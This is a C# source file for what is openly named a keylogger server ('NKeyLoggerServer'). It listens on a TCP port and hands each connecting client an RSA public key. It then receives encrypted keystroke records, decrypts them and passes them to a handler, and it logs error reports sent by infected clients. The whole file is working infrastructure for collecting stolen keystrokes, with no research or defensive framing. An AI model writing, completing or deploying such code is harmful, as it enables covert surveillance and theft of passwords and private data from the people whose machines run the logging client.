using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection.Metadata.Ecma335;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;
using static System.Runtime.InteropServices.JavaScript.JSType;
using static NKeyLoggerServer.Server;

namespace NKeyLoggerServer;
internal class Server : IDisposable
{
    private IPEndPoint ipPoint { get; set; }
    private Network network;
    private RSACryptoServiceProvider rsa;
    private bool isStart = false;
    private ConcurrentDictionary<Network, Task> connections = new ConcurrentDictionary<Network, Task>();
    private System.Timers.Timer checkClearConnectionTimer { get; set; }
    private AbstractSetting setting { get; set; }
    private CancellationTokenSource cancalableSource { get; set; }
    public Server(AbstractSetting setting)
    {
        this.setting = setting;
        checkSetting(setting);
        setting.onChangeFile += new AbstractSetting.ChangeSettingFilePath(changeFileSetting);
        this.setting = setting;
        init();
    }

    private void checkSetting(AbstractSetting setting)
    {
        int port = int.Parse(setting.Properties["port"]);
        if(port <=0 || port >= 0xFFFF)
            throw new ApplicationException("Error parse settings: invalid port");
        int cryptoKeySize = int.Parse(setting.Properties["cryptokeysize"]);
        if (cryptoKeySize <= 0x400)
            throw new ApplicationException("Error parse settings: crypto key size should be more 1024");
        int clearConnectionelipse = int.Parse(setting.Properties["clearconnectionelipse"]);
        Log<Server>.Instance.logger?.LogDebug($"Load settings into server:\n size of cryptokey - {cryptoKeySize}\n" +
                $"port - {port}\n clear connection delay - {clearConnectionelipse}\n");
    }

    private void changeFileSetting(AbstractSetting setting)
    {
        reload();
    }

    public void reload()
    {
        if (isStart == false)
            return;
        this.Dispose();
        checkSetting(this.setting);
        init();
        var newTask = start();
        updateTask?.Invoke(newTask);
        Log<Server>.Instance.logger?.LogDebug("Reload server");
    }
    private void init()
    {
        this.network = new Network();
        ipPoint = new IPEndPoint(IPAddress.Any, int.Parse(this.setting.Properties["port"]));
        rsa = new RSACryptoServiceProvider(int.Parse(this.setting.Properties["cryptokeysize"]));
        checkClearConnectionTimer = new System.Timers.Timer(int.Parse(this.setting.Properties["clearconnectionelipse"]));
        cancalableSource = new CancellationTokenSource();

        network.socket.Bind(ipPoint);
        network.socket.Listen();
        checkClearConnectionTimer.Elapsed += (sender, e) =>
            connections.Select( (KeyValuePair<Network,Task> el) =>
            {
                if (!el.Key.socket.Connected)
                    return el.Key;
                return null;
            }).ToList().ForEach( (Network? n) =>
            {
                if (n != null)
                {
                    connections.Remove(n, out _);
                }
            });
        checkClearConnectionTimer.Start();
        Log<Server>.Instance.logger?.LogDebug("Init server");
    }
    public async Task start()
    {
        if (isStart)
            return;

        isStart = true;

        while (isStart)
        {
            var socket = await network.socket.AcceptAsync(cancalableSource.Token);
            Log<Server>.Instance.logger?.LogDebug($"Connect client: {IPAddress.Parse(((IPEndPoint)socket.RemoteEndPoint!).Address.ToString())}");
            Network clientNet = new Network(socket);
            var connectionTask = Task.Factory.StartNew( async () => {
                try
                {
                    await clientNet.sendAsync(rsa.ExportRSAPublicKey(), Network.Type.CRYPTOKEY);
                    await read(clientNet);
                } catch (SocketException e)
                {
                    Log<Server>.Instance.logger?.LogError($"Address: {IPAddress.Parse( ((IPEndPoint)clientNet.socket.RemoteEndPoint!).Address.ToString() )}" +
                        $"Error: {e.Message}");
                }
                catch (Exception e)
                {
                    Log<Server>.Instance.logger?.LogError($"Address: {IPAddress.Parse(((IPEndPoint)clientNet.socket.RemoteEndPoint!).Address.ToString())}" +
                        $"Error: {e.Message}");
                }
            });
            connections[clientNet] = connectionTask;
        }
        Log<Server>.Instance.logger?.LogDebug("Start server");
    }

    public void stop()
    {
        Log<Server>.Instance.logger?.LogDebug("Stop server");
        isStart = false;
        foreach (var item in connections)
        {
            item.Key.Dispose();
        }
        var taskList = connections.Values;
        Task.WaitAll(taskList);
        connections.Clear();
        cancalableSource.Cancel();
    }

    private void stop(Network socketSuppler)
    {
        connections.Remove(socketSuppler, out _);
        socketSuppler.Dispose();
    }
    private async Task read(Network clientNet)
    {
        try
        {
            if (clientNet == null)
                throw new ArgumentNullException("Network is null");
            while (isStart)
            {
                var result = await clientNet.recvAsync();
                switch (result.type)
                {
                    case Network.Type.KEY: TakeKey(result.data, clientNet); break;
                    case Network.Type.INFO: TakeInfo(result.data, clientNet); break;
                }
            }
        } catch (SocketException e)
        {
            stop(clientNet);
            Log<Server>.Instance.logger?.LogError("Error:" + e.Message);
        }
    }

    private void TakeKey(List<byte> data, Network client)
    {
        AbstractKeyInfo keyInfo = new KeyInfo();
        byte[] decryptData = rsa.Decrypt(data.ToArray(), false);
        keyInfo.FromBytes(decryptData);
        keyHandler?.Invoke(this, client, keyInfo);
    }

    private void TakeInfo(List<byte> data, Network client)
    {
        try
        {
            string msg = $"Address: {IPAddress.Parse(((IPEndPoint)client.socket.RemoteEndPoint!).Address.ToString())} Error: {Encoding.UTF8.GetString(data.ToArray())}";
            Log<Server>.Instance.logger?.LogError(msg);
        } 
        catch (SocketException){}
        catch (ObjectDisposedException){}
    }

    ~Server()
    {
        Dispose();
    }

    public void Dispose()
    {
        stop();
        network.Dispose();
        rsa.Dispose();
        this.checkClearConnectionTimer.Dispose();
        this.cancalableSource.Dispose();
    }

    public delegate void updateStartTask(Task task);
    public event updateStartTask? updateTask;

    public event KeyHandler? keyHandler;
    public delegate void KeyHandler(Server sender, Network clientNet, AbstractKeyInfo keyInfo);
}
